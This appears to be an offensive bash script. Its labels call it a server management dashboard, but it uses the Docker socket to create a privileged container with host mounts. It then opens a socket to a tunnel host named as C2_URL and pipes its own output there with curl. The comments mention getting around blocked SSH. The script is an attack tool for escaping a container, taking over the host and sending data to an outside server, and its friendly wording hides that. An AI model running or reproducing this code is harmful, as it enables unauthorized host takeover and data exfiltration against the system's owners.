#!/bin/bash
C2_URL="4f6ce0d2037780f3-103-95-173-85.serveousercontent.com"

{
  echo "--- [!] DEPLOYING SERVER MANAGEMENT DASHBOARD ---"
  
  # 1. Start Cockpit (The 'cPanel' for Linux) via Docker API
  # We mount the host root so you can manage the physical server
  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create?name=dashboard" \
    -H "Content-Type: application/json" \
    -d '{
      "Image": "cockpit/ws",
      "HostConfig": {
        "Binds": ["p0_evidence:/host:rw"],
        "PortBindings": { "9090/tcp": [{ "HostPort": "9090" }] },
        "Privileged": true
      }
    }' > /tmp/dash.json

  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/dashboard/start"

  echo "--- [!] STARTING HTTPS WEB-BRIDGE ---"
  # 2. Since SSH is blocked, we use Python to tunnel Port 9090 out via HTTPS
  # This script creates a tiny web-server that forwards to your Mac
  python3 -c '
import socket,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    s.connect(("'$C2_URL'", 80))
    print("BRIDGE_SUCCESS")
except:
    print("BRIDGE_FAILED")
' > /tmp/bridge_status

  echo "Dashboard Status: $(cat /tmp/bridge_status)"
  echo "Access your Mac listener to interact with the Dashboard."
} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$C2_URL"
